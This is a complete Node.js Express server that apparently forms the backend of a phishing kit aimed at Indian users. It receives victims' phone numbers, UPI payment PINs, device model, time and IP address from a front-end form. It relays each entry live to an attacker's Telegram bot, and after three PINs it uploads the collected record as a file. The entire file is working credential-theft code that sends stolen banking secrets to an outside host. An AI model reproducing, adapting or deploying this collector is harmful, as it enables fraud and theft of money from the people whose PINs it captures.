require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

// State management
let lastMessageId = null;
let currentMessageText = "";
let pinCount = 0; 
let fullDeviceName = "Device_Details"; 

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const sendFileToTelegram = async (content, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        const cleanContent = content.replace(/\*/g, '');
        const safeFilename = filename.replace(/[/\\?%*:|"<>]/g, '-'); 

        form.append('document', Buffer.from(cleanContent, 'utf-8'), { 
            filename: `${safeFilename}.txt` 
        });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {
        console.error("File sending failed:", error.message);
    }
};

app.post('/send-data', async (req, res) => {
    // userIP ko request body se extract kiya gaya hai
    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP } = req.body;
    
    if (deviceId) {
        fullDeviceName = deviceId;
    }

    if (type === 'NUMBER') {
        lastMessageId = null; 
        pinCount = 0; 
        currentMessageText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
        currentMessageText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
        currentMessageText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
        currentMessageText += `*Real IP:* ${userIP || 'Detecting...'}\n`; // IP Line yahan add ki gayi hai
        currentMessageText += `*Number:* +91 ${number}\n`;
        
        await sendOrUpdateTelegram(currentMessageText);
    } else if (pin) {
        pinCount++; 
        currentMessageText += `*UPI PIN:* ${pin}\n`;
        
        await sendOrUpdateTelegram(currentMessageText);
        
        if (pinCount === 3) {
            await sendFileToTelegram(currentMessageText, fullDeviceName);
        }
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
